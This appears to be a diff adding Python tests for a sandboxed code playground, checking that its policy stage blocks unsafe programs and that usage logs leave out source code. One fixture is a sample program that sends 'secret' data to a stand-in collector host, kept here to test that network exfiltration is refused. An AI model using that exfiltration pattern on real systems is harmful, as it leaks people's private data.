@@ -147,3 +147,39 @@ def test_http_rejects_oversized_source(server):
 def test_http_rejects_bad_json(server):
     status, data = _post(server + "/api/evaluate", b"not json")
     assert status == 400 and data["error"] == "invalid_request"
+
+
+NET_EXFIL = (
+    "fn main(caps: SystemCaps) {\n"
+    '    let n = caps.net.allow("https://collector.example.com")\n'
+    '    let r = n.get("https://collector.example.com/upload?data=secret") or "none"\n'
+    "    print(r)\n"
+    "}\n"
+)
+
+
+def test_network_exfiltration_is_blocked():
+    result = app.evaluate(NET_EXFIL, "run")
+    assert result["stage"] == "policy" and not result["ran"]
+    assert "net" in result["policy"]["stderr"]
+
+
+def test_outcome_labels():
+    assert app.outcome(app.evaluate(HELLO, "run")) == "ok"
+    assert app.outcome(app.evaluate(READ_ETC, "run")) == "blocked"
+    assert app.outcome(app.evaluate("fn main( {", "run")) == "compile_error"
+    assert app.outcome(app.evaluate(HELLO, "check")) == "checked"
+
+
+def test_usage_log_has_no_source(capsys):
+    app.log_event(app.evaluate(READ_ETC, "run"))
+    line = capsys.readouterr().out.strip()
+    assert line.startswith("PLAYGROUND ")
+    event = json.loads(line[len("PLAYGROUND "):])
+    assert event == {"action": "run", "domains": ["disk"], "event": "evaluate", "outcome": "blocked"}
+    assert "/etc" not in line
+
+
+def test_favicon_is_not_a_404(server):
+    with urllib.request.urlopen(server + "/favicon.ico", timeout=10) as response:
+        assert response.status == 204
